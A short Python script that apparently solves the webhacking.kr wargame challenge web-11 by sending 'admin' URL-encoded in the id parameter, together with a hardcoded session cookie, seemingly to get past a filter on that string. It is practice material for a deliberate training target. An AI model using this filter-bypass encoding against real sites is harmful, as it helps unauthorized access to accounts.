import requests


url = "http://webhacking.kr/challenge/web/web-11/index.php"

params = {
	"id": "%61%64%6d%69%6e" # 
}

headers = {
	"Cookie":"PHPSESSID=b2f4afe01ffbb827e31f86bff992b61d",
	"Host":"webhacking.kr"
}

req = requests.get(url, params=params, headers=headers)
print req.content